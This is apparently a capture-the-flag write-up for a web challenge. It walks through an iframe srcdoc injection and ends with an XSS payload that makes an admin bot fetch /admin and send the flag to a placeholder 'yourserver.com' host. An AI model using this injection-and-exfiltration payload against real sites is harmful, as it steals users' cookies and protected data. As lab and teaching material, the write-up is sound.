## Overview

By inspecting the page you will see a `credentialless` iframe and a script.

```html
<script>
  document
    .querySelector("iframe")
    .setAttribute(
      "srcdoc",
      new URLSearchParams(document.location.search).get("srcdoc")
    );
</script>
```

As you can see you can easly inject JS code into the website by using a payload like: `http://localhost:3000/?srcdoc=<script>alert('0')</script>`

## Finding the flag

The website doesn't request an api, means we have to inspect the source code.

```md
./
├── bot.js
├── build-docker.sh
├── Dockerfile
├── flag.txt
├── index.js
├── package.json
```

- `index.js`

```js
const flag = fs.readFileSync("./flag.txt", "utf8").trim();
```

the flag variable isn't exposed at all, is is only used to verify access to `/admin`

```js
function check(req, res, next) {
  console.log("cookie", req.cookies);
  if (flag === req.cookies?.FLAG) {
    return next();
  } else {
    return res.status(403).send("Forbidden");
  }
}

app.get("/admin", check, (req, res) => {
  res.send(req.cookies?.FLAG ?? "flag{something something}");
});
```

## Observation

there's an endpoint that will let a bot visit the provided url

```js
const { visit } = require("./bot");
/* ... */
app.get("/bot", async (req, res) => {
  if (req.query?.url) await visit(req.query.url);
  res.send("If it's done it's done.");
});
```

- `bot.js`

the bot checks if url starts with `http://` before visiting it and sets the cookie value as the flag

```js
if (!url.startsWith("http://")) {
  throw new Error("invalid url");
}
await page.setCookie({
  name: "FLAG",
  value: flag,
  domain: DOMAIN,
  path: "/",
  httpOnly: true,
  secure: true,
  sameSite: "Lax",
});
```

We can't get the flag via document.cookie because of `httpOnly` and we can't get the flag in a request header because of `sameSite=Lax`.
Since the bot can access `/admin` which returns the flag (cookie) we will let the bot use it to expose the flag value and simply send it to our server.

## Payload

```
http://localhost:3000/bot?url=http://127.0.0.1:3000/?srcdoc=<script type="module">
const resp = await parent.fetch("/admin", { credentials: "include" });
fetch(`http://yourserver.com?flag=${await resp.text()}`)
</script>
```

note: replace `http://localhost:3000` with instance ip 
